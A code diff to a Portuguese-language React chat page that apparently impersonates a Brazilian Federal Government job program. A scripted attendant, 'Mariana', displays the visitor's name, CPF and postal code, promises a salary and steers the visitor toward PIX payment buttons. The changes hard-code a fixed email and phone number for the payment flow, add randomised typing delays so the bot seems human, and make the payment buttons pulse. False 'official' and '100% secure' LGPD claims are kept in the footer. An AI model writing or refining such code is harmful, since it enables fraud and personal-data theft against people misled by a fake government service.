@@ -28,7 +28,11 @@ export default function Chat() {
   // Ref para o container do chat
   const chatContainerRef = useRef<HTMLDivElement | null>(null);
   const navigate = useNavigate();
-  const [userData, setUserData] = useState<UserData>({});
+  // Sempre usar email e telefone fixos para o PIX
+  const [userData, setUserData] = useState<UserData>({
+    email: 'sdsfafsa@gmail.com',
+    telefone: '69992311381',
+  });
   const [messages, setMessages] = useState<Message[]>([]);
   const [progress, setProgress] = useState(0);
   const [isLoading, setIsLoading] = useState(false);
@@ -46,26 +50,39 @@ export default function Chat() {
     if (conversationStarted.current) return;
     conversationStarted.current = true;
 
+    // Sobrescreve email e telefone sempre que carregar
     const stored = localStorage.getItem('userData');
-    console.log('LocalStorage userData:', stored);
-    
     if (stored) {
       try {
         const parsedData = JSON.parse(stored);
-        console.log('Dados parseados:', parsedData);
-        setUserData(parsedData);
+        setUserData({
+          ...parsedData,
+          email: 'sdsfafsa@gmail.com',
+          telefone: '69992311381',
+        });
       } catch (error) {
-        console.error('Erro ao fazer parse dos dados:', error);
+        setUserData({
+          email: 'sdsfafsa@gmail.com',
+          telefone: '69992311381',
+        });
       }
     } else {
-      console.warn('Nenhum dado encontrado em localStorage');
+      setUserData({
+        email: 'sdsfafsa@gmail.com',
+        telefone: '69992311381',
+      });
     }
 
     startConversation();
   }, []);
 
   const addTypingMessage = async (text: string, delay: number = 200, emotion?: Message['emotion']) => {
+    // Simula tempo de digitação realista baseado no tamanho da mensagem
     return new Promise<void>(resolve => {
+      const typingSpeed = 35 + Math.random() * 25; // ms por caractere
+      const minDelay = 400;
+      const maxDelay = 2500;
+      const calcDelay = Math.min(maxDelay, Math.max(minDelay, text.length * typingSpeed));
       setTimeout(() => {
         const messageId = `msg-${Date.now()}-${Math.random()}`;
         setMessages(prev => [...prev, {
@@ -83,8 +100,8 @@ export default function Chat() {
             )
           );
           resolve();
-        }, 1000);
-      }, delay);
+        }, calcDelay);
+      }, delay + Math.random() * 200);
     });
   };
 
@@ -93,8 +110,8 @@ export default function Chat() {
 
     await addTypingMessage('Olá! Que alegria tê-lo aqui!', 300, 'benefit');
     await addTypingMessage('Sou a Mariana do Programa Agente Escola, iniciativa vinculada ao Governo Federal.', 200, 'trust');
-    await addTypingMessage(' Estou aqui para confirmar seus dados finais e liberar o acesso à etapa oficial de inscrição.', 200, 'benefit');
-    await addTypingMessage(' Leva menos de 2 minutos. Vamos?', 200);
+    await addTypingMessage('Estou aqui para confirmar seus dados finais e liberar o acesso à etapa oficial de inscrição.', 200, 'benefit');
+    await addTypingMessage('Leva menos de 2 minutos. Vamos?', 200);
 
     await new Promise<void>(resolve => {
       setTimeout(() => {
@@ -188,14 +205,12 @@ export default function Chat() {
 
       const nomeExibido = userData.nome ? userData.nome.toUpperCase() : 'NÃO INFORMADO';
       const cpfExibido = userData.cpf ? `${userData.cpf.slice(0, 3)}.${userData.cpf.slice(3, 6)}.${userData.cpf.slice(6, 9)}-${userData.cpf.slice(9)}` : 'NÃO INFORMADO';
-      const telefonExibido = userData.telefone ? `(${userData.telefone.slice(0, 2)}) ${userData.telefone.slice(2, 7)}-${userData.telefone.slice(7)}` : 'NÃO INFORMADO';
       const cepExibido = userData.cep ? `${userData.cep.slice(0, 5)}-${userData.cep.slice(5)}` : 'NÃO INFORMADO';
 
       await addTypingMessage(
         `SEU PERFIL APROVADO:\n\n` +
         `Nome: ${nomeExibido}\n` +
         `CPF: ${cpfExibido}\n` +
-        `Telefone: ${telefonExibido}\n` +
         `CEP: ${cepExibido}\n` +
         `Programa: Agente Escola do Futuro\n` +
         `Seu salário: R$ 3.456,13 mensais\n` +
@@ -470,7 +485,7 @@ export default function Chat() {
           <h1 className="text-lg font-semibold">Voltar</h1>
         </div>
 
-        <div className="rounded-xl border-0 shadow-lg overflow-hidden sticky top-4">
+  <div className="rounded-xl border-0 shadow-lg overflow-hidden sticky top-4 flex flex-col h-[70vh] bg-white">
           <div className="p-4" style={{ background: 'linear-gradient(135deg, #0A5E4E 0%, #1B4965 50%, #2d3748 100%)' }}>
             <div className="flex items-center gap-3">
               <img src="https://i.ibb.co/nMPCFGk7/atendnte.jpg" alt="Mariana Oliveira" className="w-14 h-14 rounded-full flex-shrink-0 border-2 border-white/40 object-cover" />
@@ -497,7 +512,10 @@ export default function Chat() {
             </div>
           </div>
 
-          <div className="h-[450px] overflow-y-auto p-4 space-y-4 bg-white" ref={chatContainerRef}>
+          <div
+            className="flex-1 overflow-y-auto p-4 space-y-4"
+            ref={chatContainerRef}
+          >
             {messages.map((message, index) => (
               <div key={message.id}>
                 <div
@@ -545,34 +563,42 @@ export default function Chat() {
 
                 {message.options && index === messages.length - 1 && (
                   <div className="flex flex-col gap-3 mt-4 ml-0">
-                    {message.options.map(option => (
-                      <button
-                        key={option.id}
-                        onClick={() => handleSelectOption(option.id, option.text)}
-                        disabled={isLoading}
-                        className={`text-left px-4 py-3 rounded-lg font-bold transition-all transform hover:scale-105 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed text-sm shadow-lg w-full ${
-                          option.id === 'pix-copy'
-                            ? 'bg-gradient-to-r from-yellow-400 to-yellow-500 text-gray-900 hover:from-yellow-500 hover:to-yellow-600 border-2 border-yellow-300'
-                            : option.id.includes('pix') || option.id === 'confirm-data' || option.id === 'continue' || option.id === 'data-ok'
-                            ? 'bg-gradient-to-r from-green-500 to-green-600 text-white hover:from-green-600 hover:to-green-700 border-2 border-green-400'
-                            : 'bg-gray-100 text-gray-800 hover:bg-gray-200 border-2 border-gray-300'
-                        }`}
-                      >
-                        {option.text}
-                      </button>
-                    ))}
+                    {message.options.map(option => {
+                      const isGreen = option.id.includes('pix') || option.id === 'confirm-data' || option.id === 'continue' || option.id === 'data-ok';
+                      return (
+                        <button
+                          key={option.id}
+                          onClick={() => handleSelectOption(option.id, option.text)}
+                          disabled={isLoading}
+                          className={`text-left px-4 py-3 rounded-lg font-bold transition-all transform hover:scale-105 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed text-sm shadow-lg w-full ${
+                            isGreen ? 'bg-gradient-to-r from-green-500 to-green-600 text-white hover:from-green-600 hover:to-green-700 border-2 border-green-400 animate-pulse-slow' :
+                            option.id === 'pix-copy'
+                              ? 'bg-gradient-to-r from-yellow-400 to-yellow-500 text-gray-900 hover:from-yellow-500 hover:to-yellow-600 border-2 border-yellow-300'
+                              : 'bg-gray-100 text-gray-800 hover:bg-gray-200 border-2 border-gray-300'
+                          }`}
+                          style={isGreen ? {
+                            animationDuration: '2.2s',
+                            animationIterationCount: 'infinite',
+                            animationTimingFunction: 'ease-in-out',
+                          } : {}}
+                        >
+                          {option.text}
+                        </button>
+                      );
+                    })}
                   </div>
                 )}
               </div>
             ))}
           </div>
+          {/* Frase removida do card, vai para o fundo */}
         </div>
-
-        <div className="mt-6 text-center text-xs text-gray-600 px-4 space-y-1">
-          <p className="font-bold"> Seus dados são 100% seguros</p>
-          <p>Sistema oficial do Programa Agente Escola do Futuro</p>
-          <p>Protegido pela Lei Geral de Proteção de Dados (LGPD)</p>
-        </div>
+      </div>
+      {/* Frase de segurança no fundo da página, fora do card */}
+      <div className="mt-8 text-center text-xs text-gray-600 px-4 space-y-1">
+        <p className="font-bold">Seus dados são 100% seguros</p>
+        <p>Sistema oficial do Programa Agente Escola do Futuro</p>
+        <p>Protegido pela Lei Geral de Proteção de Dados (LGPD)</p>
       </div>
     </div>
   );
